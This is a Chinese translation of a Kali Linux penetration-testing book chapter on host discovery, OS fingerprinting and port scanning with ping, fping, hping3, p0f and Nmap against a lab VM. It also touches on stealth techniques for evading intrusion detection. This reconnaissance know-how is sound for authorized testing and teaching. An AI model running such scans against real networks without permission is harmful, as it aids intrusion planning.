# Kali Linux 2018：通过渗透测试确保安全（二）

> 原文：[`annas-archive.org/md5/9DD5BABA897F5FE8AD4CCDC0C9A2594A`](https://annas-archive.org/md5/9DD5BABA897F5FE8AD4CCDC0C9A2594A)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五章：扫描和规避技术

在本章中，我们将描述在 Kali Linux 中使用各种工具以及 GitHub 上其他可用工具发现目标网络上的设备的过程。我们将研究以下主题：

+   目标发现过程的描述

+   使用 Kali Linux 工具识别目标机器的方法

+   查找目标机器操作系统所需的步骤（操作系统指纹识别）

+   使用 Striker 进行自动扫描

+   使用 Nipe 进行匿名化

为了帮助您轻松理解这些概念，我们将使用虚拟网络作为目标网络。

# 技术要求

这些是技术要求：

+   最低硬件要求：6 GB RAM，四核 2.4 GHz 处理器和 500 GB 硬盘

+   Kali Linux 2018

+   用于测试的虚拟机，例如 Metasploitable 或 BadStore 等（参见第二章，*设置您的测试实验室*）

# 识别目标机器

此类工具用于识别渗透测试人员可以访问的目标机器。在开始识别过程之前，我们需要了解客户的条款和协议。如果协议要求我们隐藏渗透测试活动，我们需要隐藏我们的活动。隐蔽技术也可以用于测试**入侵检测系统**（**IDS**）或**入侵预防系统**（**IPS**）的功能。如果没有这样的要求，我们可能不需要隐藏我们的渗透测试活动。

# ping

`ping`是用于检查特定主机是否可用的最著名的工具。`ping`工具通过向目标主机发送**Internet 控制消息协议**（**ICMP**）回显请求数据包来工作。如果目标主机可用且防火墙没有阻止 ICMP 回显请求数据包，它将回复 ICMP 回显回复数据包。

ICMP 回显请求和 ICMP 回显回复是可用的 ICMP 控制消息之一。有关其他 ICMP 控制消息，请参阅以下网址：[`en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages`](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages)。

虽然您在 Kali Linux 菜单中找不到`ping`，但您可以打开控制台并输入`ping`命令以及其选项。

要使用`ping`，您只需输入`ping`和目标地址，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5882d01e-65a8-4141-a511-2b5bfc104150.png)

在 Kali Linux 中，默认情况下，`ping`将持续运行，直到按下*Ctrl* + *C*。

`ping`工具有很多选项，但以下是经常使用的一些选项：

+   **`-c`** **计数**：这是要发送的回显请求数据包的数量。

+   **`-I`** **接口地址**：这是源地址的网络接口。参数可以是数字 IP 地址（如`192.168.56.102`）或设备的名称（如`eth0`）。如果要 ping IPv6 链路本地地址，则需要此选项。

+   **`-s`** **数据包大小**：指定要发送的数据字节数。默认值为 56 字节，与 ICMP 头数据的 8 字节组合在一起，可以得到 64 个 ICMP 数据字节。

让我们将前面的信息付诸实践。

假设您要开始内部渗透测试工作。客户通过局域网电缆为您提供了他们网络的访问权限，并提供了目标服务器的 IP 地址列表。

在启动完整的渗透测试工具之前，您可能想要做的第一件事是检查这些服务器是否可以从您的机器访问。您可以使用`ping`来完成这项任务。

目标服务器位于`172.16.43.156`，而您的机器的 IP 地址为`172.16.43.150`。要检查目标服务器的可用性，您可以给出以下命令：

```
    ping -c 1 172.16.43.156
```

除了 IP 地址，`ping`还接受主机名作为目标。

以下屏幕截图是前述`ping`命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d932a749-c492-4bb2-9089-1532e50438fc.png)

从前面的屏幕截图中，我们知道已向目的地（IP 地址=`172.16.43.156`）发送了一个 ICMP echo 请求数据包。同时，发送主机（IP 地址=`172.16.43.150`）收到了一个 ICMP echo 回复数据包。所需的往返时间为`.869 ms`，在整个过程中没有丢包。

让我们看看我们的机器发送和接收的网络数据包。我们将在我们的机器上使用网络协议分析器 Wireshark 来捕获这些数据包，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/9f2ce614-5024-4845-a39e-2eb550f5a864.png)

从前面的屏幕截图中，我们可以看到我们的主机（`172.16.43.150`）向目标主机（`172.16.43.156`）发送了一个 ICMP echo 请求数据包。由于目标是活动的并允许 ICMP echo 请求数据包，它将 ICMP echo 回复数据包发送回我们的机器。我们将在第九章*特权提升*的*网络嗅探器*部分更详细地介绍*Wireshark*。

如果您的目标使用 IPv6 地址，例如`fe80::20c:29ff:fe18:f08`，您可以使用`ping6`工具来检查其可用性。您需要为命令指定`-I`选项，以针对链路本地地址进行操作：

```
    # ping6 -c 1 fe80::20c:29ff:fe18:f08 -I eth0
    PING fe80::20c:29ff:fe18:f08(fe80::20c:29ff:fe18:f08) from fe80::20c:29ff:feb3:137 eth0: 56 data bytes
    64 bytes from fe80::20c:29ff:fe18:f08: icmp_seq=1 ttl=64 time=7.98 ms

    --- fe80::20c:29ff:fe18:f08 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 7.988/7.988/7.988/0.000 ms

```

以下屏幕截图显示了发送完成`ping6`请求的数据包：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/0ea32c68-8b3c-4cef-9699-55f171770f7a.png)

从前面的屏幕截图中，我们知道`ping6`正在使用`ICMPv6`请求和回复。

要阻止`ping`请求，防火墙可以配置为仅允许来自特定主机的 ICMP `echo`请求数据包，并丢弃从其他主机发送的数据包。

# fping

`ping`和`fping`之间的区别在于`fping`工具可以用来一次向多个主机发送 ping（ICMP echo）请求。您可以在命令行上指定多个目标，也可以使用包含要 ping 的主机的文件。

在默认模式下，`fping`通过监视目标主机的回复来工作。如果目标主机发送回复，将对其进行记录并从目标列表中删除。如果主机在一定时间内没有响应，将标记为`不可达`。默认情况下，`fping`将尝试向每个目标发送三个 ICMP echo 请求数据包。

要访问`fping`，可以使用控制台执行以下命令：

```
    # fping -h
```

这将显示`fping`中的用法和可用选项的描述。

以下情景将让您了解`fping`的用法。

如果我们想要一次知道`172.16.43.156`、`172.16.43.150`和`172.16.43.155`的活动主机，我们可以使用以下命令：

```
fping 172.16.43.156 172.16.43.150 172.16.43.155  
```

以下是前述命令的结果：

```
    # fping 172.16.43.156 172.16.43.150 172.16.43.155
    172.16.43.156 is alive
    172.16.43.150 is alive
    ICMP Host Unreachable from 172.16.43.150 for ICMP Echo sent to 172.16.43.155
    ICMP Host Unreachable from 172.16.43.150 for ICMP Echo sent to 172.16.43.155
    ICMP Host Unreachable from 172.16.43.150 for ICMP Echo sent to 172.16.43.155
    ICMP Host Unreachable from 172.16.43.150 for ICMP Echo sent to 172.16.43.155
    172.16.43.155 is unreachable 
```

我们还可以自动生成主机列表，而不需要逐个定义 IP 地址并识别活动主机。假设我们想要在`172.16.43.0/24`网络中找到活动主机；我们可以使用`-g`选项并定义要检查的网络，使用以下命令：

```
# fping -g 172.16.43.0/24  
```

如果我们想要更改发送到目标的 ping 尝试次数，可以使用`-r`选项（重试限制），如下命令行所示。默认情况下，有三次 ping 尝试：

```
    fping  -r 1 -g 172.16.43.149 172.16.43.160

```

命令的结果如下：

```
    # fping -r 1 -g 172.16.43.149 172.16.43.160
    172.16.43.150 is alive
    172.16.43.156 is alive
    172.16.43.149 is unreachable
    172.16.43.151 is unreachable
    172.16.43.152 is unreachable
    172.16.43.153 is unreachable
    172.16.43.154 is unreachable
    172.16.43.155 is unreachable
    172.16.43.157 is unreachable
    172.16.43.158 is unreachable
    172.16.43.159 is unreachable
    172.16.43.160 is unreachable

```

可以使用`-s`选项（打印累积统计信息）显示累积统计信息，如下所示：

```
    fping -s www.yahoo.com www.google.com www.msn.com

```

以下是前述命令行的结果：

```
    #fping -s www.yahoo.com www.google.com www.msn.com
    www.yahoo.com is alive
    www.google.com is alive
    www.msn.com is alive

           3 targets
           3 alive
           0 unreachable
           0 unknown addresses

           0 timeouts (waiting for response)
           3 ICMP Echos sent
           3 ICMP Echo Replies received
           0 other ICMP received

     28.8 ms (min round trip time)
     30.5 ms (avg round trip time)
     33.6 ms (max round trip time)
            0.080 sec (elapsed real time)

```

# hping3

`hping3`工具是一个命令行网络数据包生成器和分析器工具。创建自定义网络数据包的能力使`hping3`可以用于 TCP/IP 和安全测试，如端口扫描、防火墙规则测试和网络性能测试。

根据开发人员的说法，`hping3`还有以下几种用途：

+   测试防火墙规则

+   测试 IDS

+   利用 TCP/IP 堆栈中已知的漏洞

要访问`hping3`，请转到控制台并键入`hping3`。

您可以通过命令行、交互式 shell 或脚本的方式给`hping3`发送命令。

在没有给定命令行选项的情况下，`hping3`将向端口`0`发送一个空 TCP 数据包。

为了切换到不同的协议，您可以在命令行中使用以下选项来定义协议：

| No. | Short option | Long option | Description |
| --- | --- | --- | --- |
| 1 | `-0` | `--raw-ip` | 这发送原始 IP 数据包 |
| 2 | `-1` | `--icmp` | 这发送 ICMP 数据包 |
| 3 | `-2` | `--udp` | 这发送 UDP 数据包 |
| 4 | `-8` | `--scan` | 这表示使用扫描模式 |
| 5 | `-9` | `--listen` | 这表示使用监听模式 |

在使用 TCP 协议时，我们可以使用不带任何标志的 TCP 数据包（这是默认行为），或者我们可以使用以下标志选项之一：

| No. | Option | Flag name |
| --- | --- | --- |
| 1 | `-S` | `syn` |
| 2 | `-A` | `ack` |
| 3 | `-R` | `rst` |
| 4 | `-F` | `fin` |
| 5 | `-P` | `psh` |
| 6 | `-U` | `urg` |
| 7 | `-X` | `xmas: flags fin, urg, psh set` |
| 8 | `-Y` | `ymas` |

让我们使用`hping3`进行几种情况。 

向`192.168.56.101`机器发送一个 ICMP 回显请求数据包。使用的选项是`-1`（用于 ICMP 协议）和`-c 1`（将计数设置为一个数据包）：

```
hping3 -1 172.16.43.156 -c 1
```

以下是此命令的输出：

```
    # hping3  -1 172.16.43.156 -c 1
    HPING 172.16.43.156 (eth0 172.16.43.156): icmp mode set, 28 headers + 0 data bytes
    len=46 ip=172.16.43.156 ttl=64 id=63534 icmp_seq=0 rtt=2.5 ms

    --- 172.16.43.156 hping statistic ---
    1 packets transmitted, 1 packets received, 0% packet loss
    round-trip min/avg/max = 2.5/2.5/2.5 ms

```

从前面的输出中，我们可以确定目标机器是存活的，因为它已经回复了我们的 ICMP 回显请求。

为了验证这一点，我们使用`tcpdump`捕获了流量，以下屏幕截图显示了数据包：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/25cc7916-3d6e-4715-bfcc-57e48b1ef1e0.png)

我们可以看到目标已经用 ICMP 回显回复数据包做出了响应。

除了在命令行中给出选项外，您还可以交互地使用`hping3`。打开控制台并输入`hping3`。然后，您将看到一个提示符，可以在其中输入您的 Tcl 命令。

以下链接是 Tcl 的资源：[`www.invece.org/tclwise/`](http://www.invece.org/tclwise/)和 [`wiki.tcl.tk/`](http://wiki.tcl.tk/)。

对于上面的示例，以下是相应的 Tcl 脚本：

```
    hping3> hping send {ip(daddr=172.16.43.156)+icmp(type=8,code=0)}
```

打开一个命令行窗口，并输入以下命令以从目标服务器获取响应：

```
    hping recv eth0
```

之后，打开另一个命令行窗口输入发送请求。

以下屏幕截图显示了收到的响应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a53f30f2-3af0-492b-b7ef-79185a9a28c8.png)

您还可以使用`hping3`来检查防火墙规则。假设您有以下防火墙规则：

+   接受任何发送到端口`22`（SSH）的 TCP 数据包

+   接受与已建立连接相关的任何 TCP 数据包

+   丢弃其他数据包

要检查这些规则，您可以在`hping3`中给出以下命令，以发送一个 ICMP 回显请求数据包：

```
hping3 -1 172.16.43.156 -c 1  
```

以下代码是结果：

```
# hping3 -1 172.16.43.156 -c 1 
HPING 172.16.43.156 (eth0 172.16.43.156): icmp mode set, 28 headers + 0 data bytes 
--- 172.16.43.156 hping statistic --- 
1 packets transmitted, 0 packets received, 100% packet loss 
round-trip min/avg/max = 0.0/0.0/0.0 ms 
```

我们可以看到目标机器没有响应我们的 ping 探测。

发送一个带有 SYN 标志设置为端口`22`的 TCP 数据包，我们将得到以下屏幕截图中显示的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b1bbdb6f-f19d-4945-836e-d23f3541daea.png)

从前面的屏幕截图中，我们可以看到目标机器的防火墙允许我们的 SYN 数据包到达端口`22`。

让我们检查一下 UDP 数据包是否允许到达端口`22`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/20077aed-0b61-48f6-8506-2358bdb76a65.png)

从前面的屏幕截图中，我们可以看到目标机器的防火墙不允许我们的 UDP 数据包到达端口`22`。

`hping3`还有其他功能，但在本章中，我们只讨论了其能力的一小部分。如果您想了解更多信息，可以查阅[hping3](http://wiki.hping.org)文档网站。

# 操作系统指纹识别

在我们确认目标机器存活后，我们可以找出目标机器使用的操作系统。这种方法通常被称为**操作系统**（**OS**）指纹识别。有两种方法可以进行操作系统指纹识别：主动和被动。

在主动方法中，该工具向目标机器发送网络数据包，然后分析接收到的响应以确定目标机器的操作系统。这种方法的优点是指纹识别过程很快。然而，缺点是目标机器可能会注意到我们尝试获取其操作系统信息。

为了克服主动方法的缺点，存在一种被动的操作系统指纹识别方法。这种方法是由 Michal Zalewsky 首创的，他发布了一个名为`p0f`的工具。被动 OS 指纹识别的主要优点是在减少测试机器和目标之间的交互的同时完成工作，大大增加了指纹识别的隐蔽性。被动方法的最大缺点是这个过程比主动方法慢。

在本节中，我们将描述一些用于操作系统指纹识别的工具。

# p0f

`p0f`工具被用来 passively 对操作系统进行指纹识别。它可以用来识别以下机器上的操作系统：

+   连接到您的机器的机器（SYN 模式；这是默认模式）

+   连接到您的机器的机器（SYN + ACK 模式）

+   无法连接的机器（`RST`+模式）

+   您可以观察到其通信的机器

`p0f`工具通过分析网络活动期间发送的 TCP 数据包来工作。然后，它收集了默认情况下没有被任何公司标准化的特殊数据包的统计信息。例如，Linux 内核使用 64 字节的 ping 数据报，而 Windows 操作系统使用 32 字节的 ping 数据报或**生存时间**（**TTL**）值。对于 Windows，TTL 值为`128`，而对于 Linux，这个 TTL 值在 Linux 发行版之间有所不同。然后，`p0f`使用这些信息来确定远程机器的操作系统。

在使用 Kali Linux 附带的`p0f`工具时，我们无法对远程机器上的操作系统进行指纹识别。我们发现`p0f`工具没有更新其指纹数据库。不幸的是，我们找不到最新版本的指纹数据库。因此，我们使用了`p0f v3`（版本 3.06b）。要使用这个版本的`p0f`，只需从[`lcamtuf.coredump.cx/p0f3/releases/p0f-3.06b.tgz`](http://lcamtuf.coredump.cx/p0f3/releases/p0f-3.06b.tgz)下载`TARBALL`文件，并通过运行`build.sh`脚本来编译代码。默认情况下，指纹数据库文件（`p0f.fp`）的位置在当前目录中。如果要更改位置，例如更改为`/etc/p0f/p0f.fp`，则需要在`config.h`文件中更改这个位置并重新编译`p0f`。如果不更改位置，可能需要使用`-f`选项来定义指纹数据库文件的位置。

要访问`p0f`，打开控制台并输入`p0f -h`。这将显示其用法和选项描述。让我们使用`p0f`来识别我们正在连接的远程机器上使用的操作系统。只需在控制台中输入以下命令：

```
 p0f -f /etc/p0f/p0f.fp -o p0f.log
```

这将从文件中读取指纹数据库，并将日志信息保存到`p0f.log`文件中。然后它将显示以下信息：

```
        --- p0f 3.07b by Michal Zalewski <lcamtuf@coredump.cx> ---

    [+] Closed 1 file descriptor.
    [+] Loaded 320 signatures from '/usr/share/p0f/p0f.fp'.
    [+] Intercepting traffic on default interface 'eth0'.
    [+] Default packet filtering configured [+VLAN].
    [+] Log file 'p0f.log' opened for writing.
    [+] Entered main event loop.

```

接下来，您需要生成涉及 TCP 连接的网络活动，比如浏览远程机器或让远程机器连接到您的机器。为了进行演示，建立了与 2 号机器上 HTTP 站点的连接。

如果`p0f`成功对操作系统进行了指纹识别，您将在控制台和日志文件（`p0f.log`）中看到有关远程机器操作系统的信息。

以下是显示在控制台上的摘要信息：

```
    .-[ 172.16.43.150/41522 -> 172.16.43.156/80 (syn+ack) ]-
    |
    | server   = 172.16.43.156/80
    | os       = Linux 2.6.x
    | dist     = 0
    | params   = none
    | raw_sig  = 4:64+0:0:1460:mss*4,5:mss,sok,ts,nop,ws:df:0

```

以下截图显示了日志文件的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/41626c39-148b-4afa-8380-8c1ff649db33.png)

根据前面的结果，我们知道目标是一个`Linux 2.6`机器。

以下截图显示了来自目标机器的信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f3389df6-946c-43f7-aeb6-0a148c974037.png)

通过比较这些信息，我们知道`p0f`正确地获取了操作系统信息。远程机器正在使用 Linux 2.6 版本。

您可以通过按下*Ctrl* + *C*组合键来停止`p0f`。

# 介绍端口扫描

端口扫描的最简单定义是它是一种用于确定目标机器上**传输控制协议**（**TCP**）和**用户数据报协议**（**UDP**）端口状态的方法。开放的端口可能意味着有一个网络服务在该端口上监听，并且该服务是可访问的，而关闭的端口意味着该端口上没有网络服务在监听。

在获取端口状态之后，攻击者将检查网络服务使用的软件版本，并找出该软件版本的漏洞。例如，假设服务器 A 有 web 服务器软件版本 1.0。几天前，发布了一个安全公告。该公告提供了关于 web 服务器软件版本 1.0 中的漏洞的信息。如果攻击者发现了服务器 A 的 web 服务器并能够获取版本信息，攻击者可以利用这些信息来攻击服务器。这只是攻击者在获取有关机器上可用服务的信息后可以做的一个简单示例。

在我们深入研究端口扫描之前，让我们先讨论一下 TCP/IP 协议的理论。

# 理解 TCP/IP 协议

在 TCP/IP 协议套件中，有数十种不同的协议，但最重要的是 TCP 和 IP。IP 提供寻址、数据包路由和其他功能，用于将一台机器连接到另一台机器，而 TCP 负责管理连接，并在两台机器上的进程之间提供可靠的数据传输。IP 位于**开放系统互连**（**OSI**）模型的网络层（第 3 层），而 TCP 位于 OSI 模型的传输层（第 4 层）。

除了 TCP，传输层中的另一个关键协议是 UDP。您可能会问这两种协议之间的区别是什么。

简而言之，TCP 具有以下特点：

+   **这是一种面向连接的协议**：在 TCP 可以用于发送数据之前，想要通信的客户端和服务器必须使用三次握手机制建立 TCP 连接，如下所示：

+   客户端通过向服务器发送一个包含 SYN（同步）标志的数据包来发起连接。客户端还在 SYN 段的序列号字段中发送**初始序列号**（**ISN**）。这个 ISN 是随机选择的。

+   服务器回复自己的 SYN 段，其中包含自己的 ISN。服务器通过发送一个包含客户端`ISN` + `1`值的 ACK（确认）标志来确认客户端的 SYN。

+   客户端通过发送一个包含服务器 ISN + `1`的 ACK 标志来确认服务器。此时，客户端和服务器可以交换数据。

+   要终止连接，TCP 必须遵循这个机制：

+   客户端发送一个包含`FIN`（结束）标志的数据包。

+   服务器发送一个`ACK`（确认）数据包以通知客户端服务器已经收到了 FIN 数据包。

+   应用服务器准备关闭后，服务器发送一个 FIN 数据包。

+   然后客户端发送`ACK`数据包以确认接收服务器的`FIN`数据包。在正常情况下，每一方（客户端或服务器）都可以通过发送`FIN`数据包独立地终止其通信端。

+   **这是一种可靠的协议**：TCP 使用序列号和确认来标识数据包数据。接收方在接收到数据包时发送确认。当数据包丢失时，如果没有从接收方收到任何确认，TCP 将自动重传。如果数据包到达顺序不对，TCP 将在将其提交给应用程序之前重新排序。

+   需要传输文件或重要数据的应用程序使用 TCP，例如**超文本传输协议**（**HTTP**）和**文件传输协议**（**FTP**）。

UDP 具有与 TCP 相反的特性，如下：

+   这是一种无连接的协议。要发送数据，客户端和服务器不需要首先建立 UDP 连接。

+   它会尽力将数据包发送到目的地，但如果数据包丢失，UDP 不会自动重新发送。由应用程序重新传输数据包。

可以承受一些数据包丢失的应用程序，例如视频流和其他多媒体应用程序，使用 UDP。使用 UDP 的其他知名应用程序包括**域名系统**（**DNS**）、**动态主机配置协议**（**DHCP**）和**简单网络管理协议**（**SNMP**）。

为了使应用程序能够正确通信，传输层使用称为端口的寻址。软件进程在服务器端的特定端口号上监听，并且客户端机器将数据发送到该服务器端口，以便由服务器应用程序处理。端口号有一个 16 位地址，数字范围从`0`到`65,535`。为了避免端口号的混乱使用，有关端口号范围的通用协议如下：

+   **众所周知的端口号（**`0` **至** `1,023`**）**：此范围内的端口号是保留端口号，通常由系统管理员或特权用户运行的服务器进程使用。应用服务器使用的端口号示例包括 SSH（端口`22`）和 HTTP（端口`80`）、HTTPS（端口`443`）。

+   **注册端口号（**`1,024` **至** `49,151`**）**：用户可以向**互联网编号分配机构**（**IANA**）发送请求，为他们的客户端-服务器应用程序保留其中一个端口号。

+   **私有或动态端口号（**`49,152` **至** `65,535`**）**：任何人都可以使用此范围内的端口号，而无需向 IANA 注册。

在简要讨论了 TCP 和 UDP 之间的区别之后，让我们描述一下 TCP 和 UDP 消息格式。

# 理解 TCP 和 UDP 消息格式

TCP 消息称为段。TCP 段由头部和数据部分组成。TCP 头通常为 20 个字节长（不包括 TCP 选项）。可以使用以下屏幕截图描述 TCP 头：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5d90b6e9-1c4f-4cc3-bb4a-5c50dd27e726.png)

以下是对每个字段的简要描述：

+   **源端口**和**目标端口**各自的长度为 16 位。源端口是发送机上传输数据包的端口，而目标端口是接收数据包的目标机器上的端口。

+   **序列号（32 位）**在正常传输中，是此段数据的第一个字节的序列号。

+   **确认号（32 位）**包含发送方的序列号，增加了一个。

+   **H.Len.（4 位）**是 TCP 头的大小，以 32 位字为单位。

+   **Rsvd.** 保留供将来使用。它是一个 4 位字段，必须为零。

+   **控制位**（控制标志）包含八个 1 位标志。在原始规范（RFC 793；可以从[`www.ietf.org/rfc/rfc793.txt`](http://www.ietf.org/rfc/rfc793.txt)下载 RFC）中，TCP 只有六个标志，如下：

+   **SYN**：此标志同步序列号。此位在会话建立期间使用。

+   **ACK**：此标志表示 TCP 头中的**确认**字段是重要的。如果数据包包含此标志，这意味着它是对先前接收的数据包的确认。

+   **RST**：此标志重置连接。

+   **FIN**：此标志表示一方没有更多数据要发送。它用于优雅地终止连接。

+   **PSH**：此标志表示缓冲数据应立即推送到应用程序，而不是等待更多数据。

+   **URG**：这个标志表示 TCP 头部中的**紧急指针**字段是重要的。紧急指针指的是重要的数据序列号。

稍后，RFC 3168（RFC 可以从[`www.ietf.org/rfc/rfc3168.txt`](http://www.ietf.org/rfc/rfc3168.txt)下载）添加了两个扩展标志，如下所示：

+   **拥塞窗口减小（CWR）**：这是数据发送方用来通知数据接收方由于网络拥塞而减少了待发送的未决数据包队列

+   **显式连接通知-回显（ECN-Echo）**：这表示网络连接正在经历拥塞

+   **窗口大小（16 位）**指定接收方愿意接受的字节数

+   **校验和（16 位）**用于对 TCP 头部和数据进行错误检查

标志可以独立设置。

要获取有关 TCP 的更多信息，请参阅 RFC 793 和 RFC 3168。

当使用 SYN 数据包对目标机器的 TCP 端口进行端口扫描时，攻击者可能会面临以下行为：

+   目标机器以 SYN+ACK 数据包回应。如果我们收到这个数据包，我们就知道端口是开放的。这种行为在 TCP 规范（RFC 793）中定义，规定如果端口是开放的，SYN 数据包必须用 SYN + ACK 数据包回应，而不考虑 SYN 数据包的有效负载。

+   目标机器发送一个设置了 RST 和 ACK 位的数据包。这意味着端口是关闭的。

+   目标机器发送 ICMP 消息，比如`ICMP 端口不可达`，这意味着该端口对我们不可访问，很可能是因为防火墙阻止了它。

+   目标机器对我们没有任何回应。这可能表示该端口上没有网络服务监听，或者防火墙正在默默地阻止我们的 SYN 数据包。

从渗透测试人员的角度来看，端口开放时的行为是有趣的，因为这意味着该端口上有一个可以进一步测试的服务。

如果进行端口扫描攻击，您应该了解各种 TCP 行为的列表，以便能够更有效地进行攻击。

在扫描 UDP 端口时，您将看到不同的行为；这些将在稍后解释。在我们继续看各种 UDP 行为之前，让我们先看一下 UDP 头部格式，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/e576d8b1-6b82-466e-bda0-d05398d3f967.png)

以下是 UDP 头部中每个字段的简要解释，如前图所示。

就像 TCP 头部一样，UDP 头部也有**源端口**和**目标端口**，每个端口长度为 16 位。源端口是发送数据包的发送机器上的端口，而目标端口是接收数据包的目标机器上的端口。

+   **UDP 长度**是 UDP 头部的长度

+   **UDP 校验和（16 位）**用于对 UDP 头部和数据进行错误检查

请注意，在 UDP 头部中没有序列号、确认号和控制位字段。

在对目标机器的 UDP 端口进行端口扫描活动时，攻击者可能会面临以下行为：

+   目标机器以 UDP 数据包回应。如果我们收到这个数据包，我们就知道端口是开放的。

+   目标机器发送 ICMP 消息，比如`ICMP 端口不可达`。可以得出结论，端口是关闭的。然而，如果发送的消息不是 ICMP 不可达消息，那么意味着端口被防火墙过滤了。

+   目标机器对我们没有任何回应。这可能表示以下情况之一：

+   端口是关闭的

+   入站 UDP 数据包被阻止

+   响应被阻止

与 TCP 端口扫描相比，UDP 端口扫描的可靠性较低，因为有时 UDP 端口是开放的，但在该端口上监听的服务正在寻找特定的 UDP 有效负载。因此，服务将不会发送任何回复。

现在我们已经简要描述了端口扫描理论，让我们将其付诸实践。在接下来的几节中，我们将看看几个工具，可以帮助我们进行网络扫描。

在本章的实际场景中，我们将利用一个 Metasploitable 虚拟机作为我们的目标机器。它的 IP 地址是`172.16.43.156`，而我们的攻击机器的 IP 地址是`172.16.43.150`。

# 网络扫描仪

在本节中，我们将看看几个工具，可以用来查找开放端口、指纹远程操作系统，并枚举远程机器上的服务。

服务枚举是一种用于查找目标系统上特定端口上可用服务版本的方法。这个版本信息很重要，因为有了这个信息，渗透测试人员可以搜索存在于该软件版本的安全漏洞。

虽然通常使用标准端口，但有时系统管理员会更改某些服务的默认端口。例如，SSH 服务可能绑定到端口`22`（作为约定），但系统管理员可能会将其更改为绑定到端口`2222`。如果渗透测试人员只对 SSH 的常用端口进行端口扫描，可能无法找到该服务。当处理运行在非标准端口上的专有应用程序时，渗透测试人员也会遇到困难。通过使用服务枚举工具，这两个问题可以得到缓解，因此有可能找到服务，无论它绑定到哪个端口。

# Nmap

Nmap 是一个全面的、功能丰富的、广泛被 IT 安全社区使用的端口扫描器。它由 Fyodor 编写和维护。由于其质量和灵活性，它是渗透测试人员必备的工具。

除了用作端口扫描器外，Nmap 还具有以下几个功能：

+   主机发现：Nmap 可以用来在目标系统上找到活动的主机。默认情况下，Nmap 将发送一个 ICMP 回显请求，一个 TCP SYN 数据包到端口`443`，一个 TCP ACK 数据包到端口`80`，以及一个 ICMP 时间戳请求来进行主机发现。

+   服务/版本检测：在 Nmap 发现端口后，它可以进一步检查目标机器上使用的服务协议、应用程序名称和版本号。

+   操作系统检测：Nmap 向远程主机发送一系列数据包，并检查响应。然后，它将这些响应与其操作系统指纹数据库进行比较，并在有匹配时打印出详细信息。如果它无法确定操作系统，Nmap 将提供一个 URL，您可以提交指纹以更新其操作系统指纹数据库。当然，如果您知道目标系统使用的操作系统，应该提交指纹。

+   网络路由跟踪：这是为了确定最有可能到达目标系统的端口和协议。Nmap 路由跟踪从一个较高的 TTL 值开始，并递减直到 TTL 值达到零。

+   Nmap 脚本引擎：有了这个功能，Nmap 可以被扩展。如果您想添加一个默认 Nmap 中没有包含的检查，可以使用 Nmap 脚本引擎编写检查。目前，有检查网络服务漏洞和枚举目标系统资源的功能。

始终检查 Nmap 的新版本是一个好习惯。如果您找到了适用于 Kali Linux 的最新版本的 Nmap，可以通过发出以下命令来更新您的 Nmap：

```
apt-get update
apt-get install nmap  
```

要启动 Nmap，可以转到应用程序，然后转到信息收集。您也可以通过转到控制台来执行以下命令来启动 Nmap：

```
nmap  
```

这将显示所有 Nmap 选项及其描述。

对于 Nmap 新手来说，可用选项可能会让人感到不知所措。

幸运的是，您只需要一个选项来扫描远程机器。该选项是您的目标 IP 地址或主机名，如果您已正确设置 DNS。这可以通过以下命令完成：

```
    nmap 172.16.43.156
```

以下是没有其他选项的扫描结果：

```
    Nmap scan report for 172.16.43.156
    Host is up (0.00025s latency).
    Not shown: 977 closed ports
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    23/tcp   open  telnet
    25/tcp   open  smtp
    53/tcp   open  domain
    80/tcp   open  http
    111/tcp  open  rpcbind
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    512/tcp  open  exec
    513/tcp  open  login
    514/tcp  open  shell
    1099/tcp open  rmiregistry
    1524/tcp open  ingreslock
    2049/tcp open  nfs
    2121/tcp open  ccproxy-ftp
    3306/tcp open  mysql
    5432/tcp open  postgresql
    5900/tcp open  vnc
    6000/tcp open  X11
    6667/tcp open  irc
    8009/tcp open  ajp13
    8180/tcp open  unknown
    MAC Address: 00:0C;29:18:0F:08 (VMware)

    Nmap done: 1 IP address (1 host up) scanned in 1.7 seconds
```

从前面的结果中，我们可以看到目标机器非常容易受到攻击，因为它有许多开放的端口。

在继续使用 Nmap 之前，让我们看一下 Nmap 可以识别的端口状态。Nmap 可以识别六种端口状态，如下所示：

+   **打开**: 这意味着有一个应用程序接受 TCP 连接、UDP 数据报或 SCTP 关联。

+   **关闭**: 这意味着虽然端口是可访问的，但没有应用程序在该端口上监听。

+   **过滤**: 这意味着 Nmap 无法确定端口是否打开，因为有一个数据包过滤设备阻止了探测到达目标。

+   **未过滤**: 这意味着端口是可访问的，但 Nmap 无法确定它是打开还是关闭的。

+   **打开|过滤**: 这意味着 Nmap 无法确定端口是打开还是过滤的。当打开端口的扫描没有响应时会发生这种情况。这可以通过设置防火墙来实现丢弃数据包。

+   **关闭|过滤**: 这意味着 Nmap 无法确定端口是关闭还是过滤的。

